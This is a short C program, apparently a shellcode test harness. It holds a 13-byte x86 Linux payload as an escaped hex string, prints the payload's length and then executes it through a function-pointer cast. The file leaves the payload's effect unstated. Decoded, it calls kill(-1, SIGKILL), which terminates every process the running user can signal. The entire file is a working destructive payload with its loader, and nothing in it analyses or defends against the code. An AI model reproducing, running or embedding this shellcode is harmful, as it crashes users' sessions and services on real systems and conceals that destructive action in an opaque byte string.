#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xdb\x89\xd9\xf7\xe3\xb0\x25\x4b\xb1\x09\xcd\x80";
void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}